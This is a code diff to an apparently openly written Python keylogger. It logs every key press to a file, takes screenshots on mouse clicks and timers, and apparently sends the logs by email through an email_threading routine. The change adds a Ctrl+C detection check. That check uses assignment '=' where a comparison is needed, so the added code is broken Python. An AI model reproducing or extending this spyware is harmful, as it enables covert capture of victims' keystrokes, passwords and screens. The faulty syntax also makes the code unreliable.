@@ -6,6 +6,7 @@ import email_send
 import ss
 
 mouse_click = 0
+last_key = 0
 
 log_file = os.environ.get(
 	'pylogger_file', 
@@ -26,8 +27,11 @@ def email_threading():
 email_threading()
 
 def OnKeyPress(key):
-	global mouse_click 
-	with open(log_file, 'a') as f: 
+	global mouse_click
+	global last_key 
+	with open(log_file, 'a') as f:
+		if last_key = Key.ctrl and (key = 'c' or key = 'C'):
+			print("Success")
 		f.write(f"{key} \n")
 		mouse_click = 0
 
@@ -38,7 +42,7 @@ def OnMouseClick(x, y, button, pressed):
 	global mouse_click
 	if pressed:
 		if button == mouse_click:
-		ss.takeScreenshot()
+			ss.takeScreenshot()
 		#f.write(f"Click\n")
 		mouse_click = button
 		s = threading.Timer(data.time_seconds_ss, ss.takeScreenshot)
